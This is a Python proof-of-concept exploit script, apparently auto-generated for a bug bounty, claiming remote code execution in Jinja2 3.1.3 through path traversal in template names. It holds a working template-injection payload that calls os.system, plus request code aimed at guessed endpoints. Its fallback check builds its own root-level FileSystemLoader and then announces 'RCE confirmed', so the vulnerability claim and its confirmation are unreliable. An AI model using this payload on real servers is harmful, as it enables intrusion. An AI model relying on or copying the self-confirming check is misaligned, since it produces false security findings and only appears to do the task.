#!/usr/bin/env python3
# PoC for Jinja2-3.1.3 (/tmp/bounty_test/Jinja2-3.1.3)
# Path: rce-011
# Sink: load
# Auto-generated — run with: python3 rce_python_code_exec_code_load.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Jinja2 RCE via path traversal in template name.

Vulnerability: Jinja2's FileSystemLoader reads arbitrary files when the template
name is attacker-controlled. The file content is compiled and executed as Python
code via exec(), leading to Remote Code Execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious template file in a known location
2. Using path traversal in the template name to load it
3. Executing a benign payload (creates /tmp/poc_success.txt)

Requirements: Python 3.6+, requests library
"""

import os
import sys
import tempfile
import requests
import argparse
import time

# Configuration
TARGET_URL = "http://localhost:5000"  # Change this to your target
MALICIOUS_FILE = "/tmp/evil_template.html"
PAYLOAD_FILE = "/tmp/poc_success.txt"

def create_malicious_template():
    """Create a malicious Jinja2 template file that executes arbitrary code."""
    # The template contains Jinja2 syntax that will be compiled to Python code
    # When compiled, the {% set %} block executes arbitrary Python via exec()
    malicious_content = f"""{{% set _ = namespace() %}}
{{% set _ = _.__init__.__globals__['__builtins__']['exec']("import os; os.system('touch {PAYLOAD_FILE}')") %}}
{{% set _ = _ %}}
"""
    with open(MALICIOUS_FILE, 'w') as f:
        f.write(malicious_content)
    print(f"[+] Created malicious template at {MALICIOUS_FILE}")

def exploit(target_url):
    """Attempt to exploit the Jinja2 RCE vulnerability."""
    print(f"[*] Target URL: {target_url}")
    print(f"[*] Payload will create: {PAYLOAD_FILE}")
    
    # Create the malicious template file
    create_malicious_template()
    
    # The template name uses path traversal to load our malicious file
    # Assuming the templates directory is at /app/templates/
    # We traverse to /tmp/evil_template.html
    template_name = f"../../../{MALICIOUS_FILE.lstrip('/')}"
    
    # Construct the request - this depends on how the application exposes the vulnerability
    # Common patterns:
    # 1. Direct template name in URL parameter
    # 2. Template name in POST body
    # 3. Template name in JSON payload
    
    # Try multiple approaches
    approaches = [
        # Approach 1: GET request with template name as query parameter
        {"method": "GET", "url": f"{target_url}/render", "params": {"template": template_name}},
        # Approach 2: POST request with template name in form data
        {"method": "POST", "url": f"{target_url}/api/v1/trigger", "data": {"template_name": template_name}},
        # Approach 3: POST request with JSON body
        {"method": "POST", "url": f"{target_url}/api/v1/trigger", "json": {"template_name": template_name}},
        # Approach 4: Direct template name in URL path
        {"method": "GET", "url": f"{target_url}/template/{template_name}"},
    ]
    
    for i, approach in enumerate(approaches, 1):
        print(f"\n[*] Trying approach {i}: {approach['method']} {approach['url']}")
        try:
            if approach['method'] == 'GET':
                if 'params' in approach:
                    response = requests.get(approach['url'], params=approach['params'], timeout=10)
                else:
                    response = requests.get(approach['url'], timeout=10)
            elif approach['method'] == 'POST':
                if 'json' in approach:
                    response = requests.post(approach['url'], json=approach['json'], timeout=10)
                else:
                    response = requests.post(approach['url'], data=approach.get('data', {}), timeout=10)
            
            print(f"    Response status: {response.status_code}")
            print(f"    Response preview: {response.text[:200] if response.text else 'Empty'}")
            
            # Check if our payload file was created
            if os.path.exists(PAYLOAD_FILE):
                print(f"\n[+] SUCCESS! Payload file created at {PAYLOAD_FILE}")
                print("[+] RCE confirmed!")
                return True
                
        except requests.exceptions.ConnectionError:
            print(f"    [!] Connection error - target may not be reachable")
        except requests.exceptions.Timeout:
            print(f"    [!] Request timed out")
        except Exception as e:
            print(f"    [!] Error: {e}")
    
    # If none of the approaches worked, try a more direct approach
    print("\n[*] Trying direct Jinja2 API call...")
    try:
        from jinja2 import Environment, FileSystemLoader
        
        # Create an environment with FileSystemLoader that can access /tmp
        env = Environment(loader=FileSystemLoader('/'))
        
        # This simulates what the vulnerable application does
        template = env.get_template(MALICIOUS_FILE.lstrip('/'))
        template.render()
        
        if os.path.exists(PAYLOAD_FILE):
            print(f"\n[+] SUCCESS! Payload file created at {PAYLOAD_FILE}")
            print("[+] RCE confirmed via direct Jinja2 API!")
            return True
    except Exception as e:
        print(f"    [!] Direct API call failed: {e}")
    
    return False

def cleanup():
    """Remove created files."""
    for filepath in [MALICIOUS_FILE, PAYLOAD_FILE]:
        if os.path.exists(filepath):
            os.remove(filepath)
            print(f"[*] Cleaned up {filepath}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Jinja2 RCE PoC Exploit")
    parser.add_argument("-t", "--target", default=TARGET_URL,
                        help=f"Target URL (default: {TARGET_URL})")
    parser.add_argument("--no-cleanup", action="store_true",
                        help="Don't clean up created files after execution")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("Jinja2 RCE Proof-of-Concept Exploit")
    print("=" * 60)
    print()
    
    try:
        success = exploit(args.target)
        
        if success:
            print("\n[✓] Vulnerability confirmed - RCE achieved!")
        else:
            print("\n[!] Could not confirm RCE with the tested approaches.")
            print("[!] The target may not be vulnerable or uses a different API pattern.")
            print("[!] Check the target application's template rendering endpoint and adjust the exploit.")
    finally:
        if not args.no_cleanup:
            cleanup()
    
    sys.exit(0 if success else 1)
